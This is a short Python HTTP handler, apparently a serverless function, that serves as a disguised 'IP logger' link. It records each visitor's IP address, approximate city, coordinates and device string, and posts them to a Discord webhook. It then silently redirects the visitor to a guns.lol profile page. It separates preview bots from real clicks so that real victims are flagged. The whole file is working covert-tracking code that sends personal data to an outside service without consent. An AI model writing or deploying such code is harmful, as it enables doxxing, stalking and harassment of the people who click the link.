from http.server import BaseHTTPRequestHandler
import requests
import json

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        user_agent = self.headers.get('User-Agent', '')
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # Check if it's just a Discord preview bot or a real person
        is_bot = "Discordbot" in user_agent or "TelegramBot" in user_agent
        
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
            location = f"{geo.get('city')}, {geo.get('country')}"
            coords = f"{geo.get('lat')}, {geo.get('lon')}"
        except:
            location = coords = "Unknown"

        if is_bot:
            # Alert: The link was just sent/previewed
            title = "📤 Link Sent / Previewed"
            color = 3447003 # Blue
        else:
            # Alert: A real person clicked it
            title = "🎯 New Visitor Logged!"
            color = 16711680 # Red

        data = {
            "embeds": [{
                "title": title,
                "color": color,
                "fields": [
                    {"name": "🌐 IP Address", "value": ip, "inline": True},
                    {"name": "📍 Location", "value": location, "inline": True},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "📱 Device", "value": user_agent[:250], "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        requests.post(WEBHOOK_URL, json=data)
        
        # Always redirect the user
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
